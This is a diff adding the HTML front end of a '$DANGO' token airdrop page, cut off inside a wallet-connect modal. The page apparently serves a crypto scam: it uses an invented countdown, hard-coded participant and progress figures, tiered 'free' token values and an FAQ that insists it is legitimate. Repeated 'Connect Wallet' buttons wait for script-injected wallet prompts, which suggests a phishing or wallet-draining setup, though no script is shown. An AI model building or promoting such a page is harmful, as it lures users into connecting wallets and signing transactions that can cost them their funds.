@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DanGo Airdrop — Claim Your $DANGO Tokens</title>
+  <meta name="description" content="Participate in the DanGo NFT exclusive airdrop. Claim your $DANGO tokens before the countdown ends. Limited allocation — don't miss out!" />
+  <meta property="og:title" content="DanGo Airdrop — Claim Your $DANGO Tokens" />
+  <meta property="og:description" content="Claim your free $DANGO tokens in the DanGo NFT airdrop. Limited supply. Whitelist spots filling fast." />
+  <meta property="og:type" content="website" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Animated Background Canvas -->
+  <canvas id="bg-canvas"></canvas>
+
+  <!-- Floating Orbs -->
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+
+  <!-- Navigation -->
+  <nav id="navbar">
+    <div class="nav-inner">
+      <div class="nav-logo">
+        <span class="logo-icon">⬡</span>
+        <span class="logo-text">DanGo</span>
+        <span class="logo-badge">AIRDROP</span>
+      </div>
+      <ul class="nav-links">
+        <li><a href="#how-it-works">How It Works</a></li>
+        <li><a href="#tokenomics">Tokenomics</a></li>
+        <li><a href="#eligibility">Eligibility</a></li>
+        <li><a href="#faq">FAQ</a></li>
+      </ul>
+      <div class="button-container blur-c-iRGRsb blur-c-gzBpsk">
+            <!-- Wallet dropdown will be inserted here by JavaScript -->
+            <button id="connect-wallet" class="nav-cta">Connect Wallet</button>
+          </div>
+      <button class="nav-hamburger" id="hamburger" aria-label="Open menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- Mobile Menu -->
+  <div class="mobile-menu" id="mobile-menu">
+    <a href="#how-it-works" class="mobile-link">How It Works</a>
+    <a href="#tokenomics" class="mobile-link">Tokenomics</a>
+    <a href="#eligibility" class="mobile-link">Eligibility</a>
+    <a href="#faq" class="mobile-link">FAQ</a>
+ <div class="button-container blur-c-iRGRsb blur-c-gzBpsk">
+            <!-- Wallet dropdown will be inserted here by JavaScript -->
+            <button id="connect-wallet" class="nav-cta">Connect Wallet</button>
+          </div>
+  </div>
+
+  <!-- ===== HERO SECTION ===== -->
+  <section id="hero">
+    <div class="hero-content">
+      <div class="hero-tag">
+        <span class="pulse-dot"></span>
+        Live Airdrop · Phase 1
+      </div>
+      <h1 class="hero-title">
+        Claim Your<br/>
+        <span class="gradient-text">$DANGO</span><br/>
+        Tokens Free
+      </h1>
+      <p class="hero-subtitle">
+        The DanGo NFT ecosystem is launching its native token. Early holders, NFT stakers, and community members are eligible for a free allocation. Secure yours before time runs out.
+      </p>
+
+      <!-- Countdown Timer -->
+      <div class="countdown-wrapper">
+        <p class="countdown-label">Airdrop Ends In</p>
+        <div class="countdown" id="countdown">
+          <div class="countdown-unit">
+            <span class="countdown-val" id="days">00</span>
+            <span class="countdown-name">Days</span>
+          </div>
+          <div class="countdown-sep">:</div>
+          <div class="countdown-unit">
+            <span class="countdown-val" id="hours">00</span>
+            <span class="countdown-name">Hours</span>
+          </div>
+          <div class="countdown-sep">:</div>
+          <div class="countdown-unit">
+            <span class="countdown-val" id="minutes">00</span>
+            <span class="countdown-name">Mins</span>
+          </div>
+          <div class="countdown-sep">:</div>
+          <div class="countdown-unit">
+            <span class="countdown-val" id="seconds">00</span>
+            <span class="countdown-name">Secs</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTA Buttons -->
+    <div class="button-container blur-c-iRGRsb blur-c-gzBpsk">
+            <!-- Wallet dropdown will be inserted here by JavaScript -->
+            <button id="connect-wallet" class="nav-cta">Connect Wallet</button>
+          </div>
+
+      <!-- Stats Row -->
+      <div class="hero-stats">
+        <div class="stat-item">
+          <span class="stat-val" id="stat-claimed">0</span>
+          <span class="stat-label">Tokens Claimed</span>
+        </div>
+        <div class="stat-divider"></div>
+        <div class="stat-item">
+          <span class="stat-val">12,500</span>
+          <span class="stat-label">Participants</span>
+        </div>
+        <div class="stat-divider"></div>
+        <div class="stat-item">
+          <span class="stat-val">$0.42</span>
+          <span class="stat-label">Token Price</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Hero Visual -->
+    <div class="hero-visual">
+      <div class="token-3d">
+        <div class="token-face front">
+          <span class="token-symbol">⬡</span>
+          <span class="token-name">DANGO</span>
+        </div>
+        <div class="token-face back">
+          <span class="token-symbol">◈</span>
+        </div>
+      </div>
+      <div class="token-ring ring-1"></div>
+      <div class="token-ring ring-2"></div>
+      <div class="token-ring ring-3"></div>
+      <div class="floating-chips">
+        <div class="chip chip-1">+500 $DANGO</div>
+        <div class="chip chip-2">NFT Holder</div>
+        <div class="chip chip-3">Early Bird</div>
+        <div class="chip chip-4">+1000 $DANGO</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Ticker Marquee -->
+  <div class="ticker-wrap">
+    <div class="ticker">
+      <span>$DANGO Airdrop Live</span>
+      <span class="dot">•</span>
+      <span>5,000,000 Tokens Available</span>
+      <span class="dot">•</span>
+      <span>Phase 1 Allocation</span>
+      <span class="dot">•</span>
+      <span>NFT Holders Get 2x Bonus</span>
+      <span class="dot">•</span>
+      <span>Claim Before Deadline</span>
+      <span class="dot">•</span>
+      <span>$DANGO Airdrop Live</span>
+      <span class="dot">•</span>
+      <span>5,000,000 Tokens Available</span>
+      <span class="dot">•</span>
+      <span>Phase 1 Allocation</span>
+      <span class="dot">•</span>
+      <span>NFT Holders Get 2x Bonus</span>
+      <span class="dot">•</span>
+      <span>Claim Before Deadline</span>
+      <span class="dot">•</span>
+    </div>
+  </div>
+
+  <!-- ===== HOW IT WORKS ===== -->
+  <section id="how-it-works" class="section">
+    <div class="container">
+      <div class="section-header">
+        <span class="section-tag">Process</span>
+        <h2 class="section-title">How to Claim</h2>
+        <p class="section-sub">Three simple steps to receive your $DANGO allocation</p>
+      </div>
+      <div class="steps-grid">
+        <div class="step-card" data-step="01">
+          <div class="step-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+              <rect x="3" y="3" width="18" height="18" rx="3"/>
+              <path d="M9 12l2 2 4-4"/>
+            </svg>
+          </div>
+          <h3>Connect Wallet</h3>
+          <p>Link your MetaMask, Phantom, or any Web3 wallet to verify your address and check your eligibility instantly.</p>
+          <div class="step-number">01</div>
+        </div>
+        <div class="step-card" data-step="02">
+          <div class="step-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+              <circle cx="12" cy="12" r="9"/>
+              <path d="M12 8v4l3 3"/>
+            </svg>
+          </div>
+          <h3>Verify Eligibility</h3>
+          <p>Our system checks your NFT holdings, staking history, and community participation to calculate your allocation.</p>
+          <div class="step-number">02</div>
+        </div>
+        <div class="step-card" data-step="03">
+          <div class="step-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+            </svg>
+          </div>
+          <h3>Claim Tokens</h3>
+          <p>Sign the transaction with your wallet. Your $DANGO tokens will be delivered directly to your address on-chain.</p>
+          <div class="step-number">03</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== TOKENOMICS ===== -->
+  <section id="tokenomics" class="section section-dark">
+    <div class="container">
+      <div class="section-header">
+        <span class="section-tag">Supply</span>
+        <h2 class="section-title">Tokenomics</h2>
+        <p class="section-sub">A transparent allocation built for long-term growth</p>
+      </div>
+      <div class="token-grid">
+        <div class="token-chart-wrap">
+          <canvas id="donut-chart" width="320" height="320"></canvas>
+          <div class="chart-center">
+            <span class="chart-total">100M</span>
+            <span class="chart-label">Total Supply</span>
+          </div>
+        </div>
+        <div class="token-breakdown">
+          <div class="breakdown-item" data-color="#7c3aed">
+            <div class="breakdown-dot" style="background:#7c3aed"></div>
+            <div class="breakdown-info">
+              <span class="breakdown-name">Airdrop</span>
+              <span class="breakdown-pct">5%</span>
+            </div>
+            <div class="breakdown-bar">
+              <div class="breakdown-fill" style="width:5%;background:#7c3aed"></div>
+            </div>
+            <span class="breakdown-amount">5,000,000 $DANGO</span>
+          </div>
+          <div class="breakdown-item" data-color="#06b6d4">
+            <div class="breakdown-dot" style="background:#06b6d4"></div>
+            <div class="breakdown-info">
+              <span class="breakdown-name">Community</span>
+              <span class="breakdown-pct">30%</span>
+            </div>
+            <div class="breakdown-bar">
+              <div class="breakdown-fill" style="width:30%;background:#06b6d4"></div>
+            </div>
+            <span class="breakdown-amount">30,000,000 $DANGO</span>
+          </div>
+          <div class="breakdown-item" data-color="#10b981">
+            <div class="breakdown-dot" style="background:#10b981"></div>
+            <div class="breakdown-info">
+              <span class="breakdown-name">Ecosystem</span>
+              <span class="breakdown-pct">25%</span>
+            </div>
+            <div class="breakdown-bar">
+              <div class="breakdown-fill" style="width:25%;background:#10b981"></div>
+            </div>
+            <span class="breakdown-amount">25,000,000 $DANGO</span>
+          </div>
+          <div class="breakdown-item" data-color="#f59e0b">
+            <div class="breakdown-dot" style="background:#f59e0b"></div>
+            <div class="breakdown-info">
+              <span class="breakdown-name">Team & Advisors</span>
+              <span class="breakdown-pct">15%</span>
+            </div>
+            <div class="breakdown-bar">
+              <div class="breakdown-fill" style="width:15%;background:#f59e0b"></div>
+            </div>
+            <span class="breakdown-amount">15,000,000 $DANGO</span>
+          </div>
+          <div class="breakdown-item" data-color="#ec4899">
+            <div class="breakdown-dot" style="background:#ec4899"></div>
+            <div class="breakdown-info">
+              <span class="breakdown-name">Reserve & Treasury</span>
+              <span class="breakdown-pct">25%</span>
+            </div>
+            <div class="breakdown-bar">
+              <div class="breakdown-fill" style="width:25%;background:#ec4899"></div>
+            </div>
+            <span class="breakdown-amount">25,000,000 $DANGO</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== ELIGIBILITY ===== -->
+  <section id="eligibility" class="section">
+    <div class="container">
+      <div class="section-header">
+        <span class="section-tag">Who Qualifies</span>
+        <h2 class="section-title">Eligibility Tiers</h2>
+        <p class="section-sub">Different tiers unlock different allocation sizes</p>
+      </div>
+      <div class="tiers-grid">
+        <div class="tier-card tier-bronze">
+          <div class="tier-badge">Bronze</div>
+          <div class="tier-icon">🥉</div>
+          <div class="tier-amount">500 <span>$DANGO</span></div>
+          <ul class="tier-reqs">
+            <li>Wallet age > 90 days</li>
+            <li>Any on-chain activity</li>
+            <li>Twitter follow + retweet</li>
+          </ul>
+          <div class="tier-value">≈ $210 value</div>
+        </div>
+        <div class="tier-card tier-silver">
+          <div class="tier-badge">Silver</div>
+          <div class="tier-icon">🥈</div>
+          <div class="tier-amount">1,000 <span>$DANGO</span></div>
+          <ul class="tier-reqs">
+            <li>Hold any DanGo NFT</li>
+            <li>Wallet age > 180 days</li>
+            <li>Discord member</li>
+          </ul>
+          <div class="tier-value">≈ $420 value</div>
+        </div>
+        <div class="tier-card tier-gold featured">
+          <div class="featured-tag">Most Popular</div>
+          <div class="tier-badge">Gold</div>
+          <div class="tier-icon">🥇</div>
+          <div class="tier-amount">2,500 <span>$DANGO</span></div>
+          <ul class="tier-reqs">
+            <li>Hold 3+ DanGo NFTs</li>
+            <li>Staked in ecosystem</li>
+            <li>OG community member</li>
+          </ul>
+          <div class="tier-value">≈ $1,050 value</div>
+        </div>
+        <div class="tier-card tier-diamond">
+          <div class="tier-badge">Diamond</div>
+          <div class="tier-icon">💎</div>
+          <div class="tier-amount">5,000 <span>$DANGO</span></div>
+          <ul class="tier-reqs">
+            <li>Genesis NFT holder</li>
+            <li>Top 100 stakers</li>
+            <li>Verified whitelist</li>
+          </ul>
+          <div class="tier-value">≈ $2,100 value</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== CLAIM SECTION ===== -->
+  <section id="claim" class="section section-claim">
+    <div class="container">
+      <div class="claim-wrapper">
+        <div class="claim-left">
+          <span class="section-tag">Claim</span>
+          <h2 class="section-title">Ready to Claim?</h2>
+          <p class="claim-desc">Enter your wallet address below to check your eligibility and claim your $DANGO allocation. Make sure you're on the correct network.</p>
+          <div class="claim-note">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18"><circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01"/></svg>
+            Claiming is free — you only pay gas fees.
+          </div>
+          <div class="claim-social">
+            <p>Share & earn bonus $DANGO:</p>
+            <div class="social-btns">
+              <button class="social-btn twitter" id="share-twitter">
+                <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.737-8.835L1.254 2.25H8.08l4.259 5.632 5.905-5.632Zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                Share on X
+              </button>
+              <button class="social-btn discord" id="share-discord">
+                <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.082.114 18.105.133 18.12a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+                Share on Discord
+              </button>
+            </div>
+          </div>
+        </div>
+        <div class="claim-right">
+          <div class="claim-card">
+            <div class="claim-card-header">
+              <span class="claim-card-title">Claim $DANGO</span>
+              <span class="claim-status-dot"></span>
+            </div>
+
+            <!-- Step 1: Enter Wallet -->
+            <div class="claim-step active" id="step-wallet">
+              <label for="wallet-input" class="input-label">Your Wallet Address</label>
+              <div class="input-wrap">
+                <input type="text" id="wallet-input" class="wallet-input" placeholder="0x... or ENS name" autocomplete="off" spellcheck="false" />
+                <button class="input-icon-btn" id="paste-btn" title="Paste from clipboard">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                </button>
+              </div>
+              <div class="network-select-wrap">
+                <label class="input-label">Network</label>
+                <div class="network-select">
+                  <button class="network-btn active" data-network="eth" id="net-eth">
+                    <span class="net-icon">Ξ</span> Ethereum
+                  </button>
+                  <button class="network-btn" data-network="sol" id="net-sol">
+                    <span class="net-icon">◎</span> Solana
+                  </button>
+                  
+                </div>
+              </div>
+            <div class="button-container blur-c-iRGRsb blur-c-gzBpsk">
+            <!-- Wallet dropdown will be inserted here by JavaScript -->
+            <button id="connect-wallet" class="nav-cta">Connect Wallet</button>
+          </div>
+              <p class="terms-note">By claiming, you agree to our <a href="#faq">Terms & Conditions</a>.</p>
+            </div>
+
+            <!-- Step 2: Checking -->
+            <div class="claim-step" id="step-checking">
+              <div class="checking-anim">
+                <div class="spinner"></div>
+                <p class="checking-text">Verifying eligibility…</p>
+                <div class="check-progress">
+                  <div class="check-bar" id="check-bar"></div>
+                </div>
+                <p class="check-sub" id="check-sub-text">Scanning on-chain data…</p>
+              </div>
+            </div>
+
+            <!-- Step 3: Result -->
+            <div class="claim-step" id="step-result">
+              <!-- Filled dynamically by JS -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== PROGRESS BAR ===== -->
+  <section class="section section-progress">
+    <div class="container">
+      <div class="progress-card">
+        <div class="progress-header">
+          <span class="progress-title">Airdrop Progress</span>
+          <span class="progress-pct" id="progress-pct">73%</span>
+        </div>
+        <div class="progress-track">
+          <div class="progress-fill" id="progress-fill"></div>
+          <div class="progress-glow"></div>
+        </div>
+        <div class="progress-labels">
+          <span>0 Claimed</span>
+          <span id="progress-claimed-text">3,650,000 / 5,000,000 $DANGO</span>
+          <span>5M Total</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== FAQ ===== -->
+  <section id="faq" class="section section-dark">
+    <div class="container">
+      <div class="section-header">
+        <span class="section-tag">Questions</span>
+        <h2 class="section-title">FAQ</h2>
+        <p class="section-sub">Everything you need to know about the $DANGO airdrop</p>
+      </div>
+      <div class="faq-list">
+        <div class="faq-item">
+          <button class="faq-q" aria-expanded="false">
+            What is the $DANGO token?
+            <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </button>
+          <div class="faq-a">
+            <p>$DANGO is the native utility token of the DanGo NFT ecosystem. It powers governance, staking rewards, marketplace fees, and exclusive holder benefits across the entire platform.</p>
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-q" aria-expanded="false">
+            When will I receive my tokens?
+            <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </button>
+          <div class="faq-a">
+            <p>Tokens are distributed on a rolling basis after verification. Most claims are processed within 24–48 hours. You'll see the $DANGO appear in your wallet once the transaction is confirmed on-chain.</p>
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-q" aria-expanded="false">
+            Is there a vesting schedule?
+            <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </button>
+          <div class="faq-a">
+            <p>Airdrop tokens for Bronze and Silver tiers are fully unlocked at distribution. Gold tier has a 3-month linear vesting, and Diamond tier has 20% unlocked at TGE with 6-month vesting for the remainder.</p>
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-q" aria-expanded="false">
+            Can I claim on multiple wallets?
+            <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </button>
+          <div class="faq-a">
+            <p>Each eligible wallet address can claim once. Sybil detection is in place — any attempt to game the system using multiple wallets will result in all associated addresses being blacklisted.</p>
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-q" aria-expanded="false">
+            What wallets are supported?
+            <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </button>
+          <div class="faq-a">
+            <p>We support MetaMask, WalletConnect, Phantom (Solana), Trust Wallet, Coinbase Wallet, and any EVM-compatible wallet. ENS names are also resolved automatically.</p>
+          </div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-q" aria-expanded="false">
+            Is this airdrop legitimate?
+            <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+          </button>
+          <div class="faq-a">
+            <p>Yes. This is the official DanGo NFT project airdrop. We will never ask for your seed phrase or private keys. All transactions are on-chain and verifiable. Beware of impersonators — always check the URL.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== FOOTER ===== -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-top">
+        <div class="footer-brand">
+          <div class="nav-logo">
+            <span class="logo-icon">⬡</span>
+            <span class="logo-text">DanGo</span>
+          </div>
+          <p>The official $DANGO token airdrop. Built on trust, transparency, and community.</p>
+          <div class="footer-socials">
+            <a href="#" class="footer-social" aria-label="Twitter">
+              <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.737-8.835L1.254 2.25H8.08l4.259 5.632 5.905-5.632Zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            </a>
+            <a href="#" class="footer-social" aria-label="Discord">
+              <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.082.114 18.105.133 18.12a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+            </a>
+            <a href="#" class="footer-social" aria-label="Telegram">
+              <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+            </a>
+          </div>
+        </div>
+        <div class="footer-links-group">
+          <h4>Airdrop</h4>
+          <a href="#how-it-works">How It Works</a>
+          <a href="#eligibility">Eligibility</a>
+          <a href="#claim">Claim Tokens</a>
+        </div>
+        <div class="footer-links-group">
+          <h4>Resources</h4>
+          <a href="#tokenomics">Tokenomics</a>
+          <a href="#faq">FAQ</a>
+          <a href="#">Whitepaper</a>
+        </div>
+        <div class="footer-links-group">
+          <h4>Legal</h4>
+          <a href="#">Terms of Service</a>
+          <a href="#">Privacy Policy</a>
+          <a href="#">Cookie Policy</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>© 2026 DanGo NFT. All rights reserved. $DANGO is not a financial investment — always DYOR.</p>
+        <p class="footer-contract">Contract: <span class="mono">0x7Ac3...f4dE</span></p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ===== WALLET CONNECT MODAL ===== -->
+  <div class="wc-overlay" id="wc-overlay" role="dialog" aria-modal="true" aria-labelledby="wc-title">
+    <div class="wc-modal" id="wc-modal">
+
+      <!-- Modal Header -->
+      <div class="wc-header">
+        <div class="wc-header-left">
+          <div class="wc-logo">⬡</div>
+          <div>
+            <div class="wc-title" id="wc-title">Connect Wallet</div>
+            <div class="wc-subtitle">Choose your wallet to continue</div>
+          </div>
+        </div>
+        <button class="wc-close" id="wc-close" aria-label="Close">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="18" height="18"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </button>
+      </div>
+
+      <!-- Wallet Screens -->
+      <!-- Screen 1: Wallet List -->
+      <div class="wc-screen active" id="wc-screen-list">
+        <p class="wc-screen-label">Popular wallets</p>
+        <div class="wc-wallet-list">
+
+          <button class="wc-wallet-btn" data-wallet="metamask" id="wc-metamask">
+            <div class="wc-wallet-icon" style="background:linear-gradient(135deg,#f6851b,#e2761b)">
+              <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" width="26" height="26">
+                <path d="M34.3 5L22.1 13.7l2.2-5.2L34.3 5z" fill="#E17726" stroke="#E17726" stroke-width=".25"/>
+                <path d="M5.7 5l12.1 8.8-2.1-5.3L5.7 5z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+                <path d="M29.8 27.2l-3.2 4.9 6.8 1.9 2-6.6-5.6-.2z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+                <path d="M4.6 27.4l2 6.6 6.8-1.9-3.3-4.9-5.5.2z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+                <path d="M13 18.2l-1.9 2.9 6.8.3-.2-7.3L13 18.2z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+                <path d="M27 18.2l-4.8-4.2-.2 7.4 6.8-.3L27 18.2z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+                <path d="M13.4 32.1l4.1-2-3.5-2.7-.6 4.7z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+                <path d="M22.5 30.1l4.1 2-.6-4.7-3.5 2.7z" fill="#E27625" stroke="#E27625" stroke-width=".25"/>
+              </svg>
+            </div>
+            <div class="wc-wallet-info">
+              <span class="wc-wallet-name">MetaMask</span>
+              <span class="wc-wallet-desc">Most popular · Browser extension</span>
+            </div>
+            <div class="wc-wallet-badge installed" id="mm-badge">Installed</div>
+            <svg class="wc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M9 18l6-6-6-6"/></svg>
+          </button>
+
+          <button class="wc-wallet-btn" data-wallet="walletconnect" id="wc-walletconnect">
+            <div class="wc-wallet-icon" style="background:linear-gradient(135deg,#3b99fc,#0052cc)">
+              <svg viewBox="0 0 40 40" fill="white" xmlns="http://www.w3.org/2000/svg" width="26" height="26">
+                <path d="M9.6 14.4c5.8-5.7 15.1-5.7 20.9 0l.7.7c.3.3.3.7 0 1l-2.4 2.3c-.1.2-.4.2-.5 0l-1-1c-4-4-10.5-4-14.5 0l-1.1 1c-.1.2-.4.2-.5 0L8.7 16c-.3-.3-.3-.7 0-1l.9-.6zm25.8 4.8 2.1 2.1c.3.3.3.7 0 1l-9.6 9.4c-.3.3-.7.3-1 0l-6.8-6.6c-.1-.1-.2-.1-.3 0l-6.8 6.6c-.3.3-.7.3-1 0L2.5 22.3c-.3-.3-.3-.7 0-1l2.1-2.1c.3-.3.7-.3 1 0l6.8 6.6c.1.1.2.1.3 0l6.8-6.6c.3-.3.7-.3 1 0l6.8 6.6c.1.1.2.1.3 0l6.5-6.6c.3-.3.8-.3 1 .1z"/>
+              </svg>
+            </div>
+            <div class="wc-wallet-info">
+              <span class="wc-wallet-name">WalletConnect</span>
+              <span class="wc-wallet-desc">Scan QR with any wallet</span>
+            </div>
+            <div class="wc-wallet-badge qr">QR Code</div>
+            <svg class="wc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M9 18l6-6-6-6"/></svg>
+          </button>
+
+          <button class="wc-wallet-btn" data-wallet="coinbase" id="wc-coinbase">
+            <div class="wc-wallet-icon" style="background:linear-gradient(135deg,#1652f0,#0039a6)">
+              <svg viewBox="0 0 40 40" fill="white" xmlns="http://www.w3.org/2000/svg" width="26" height="26">
+                <circle cx="20" cy="20" r="14"/>
+                <path d="M20 10c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10S25.5 10 20 10zm0 16c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6z" fill="#1652f0"/>
+                <rect x="16" y="18" width="8" height="4" rx="2" fill="white"/>
+              </svg>
+            </div>
+            <div class="wc-wallet-info">
+              <span class="wc-wallet-name">Coinbase Wallet</span>
+              <span class="wc-wallet-desc">Mobile & browser extension</span>
+            </div>
+            <svg class="wc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M9 18l6-6-6-6"/></svg>
+          </button>
+
+          <button class="wc-wallet-btn" data-wallet="phantom" id="wc-phantom">
+            <div class="wc-wallet-icon" style="background:linear-gradient(135deg,#ab9ff2,#6c52dc)">
+              <svg viewBox="0 0 40 40" fill="white" xmlns="http://www.w3.org/2000/svg" width="26" height="26">
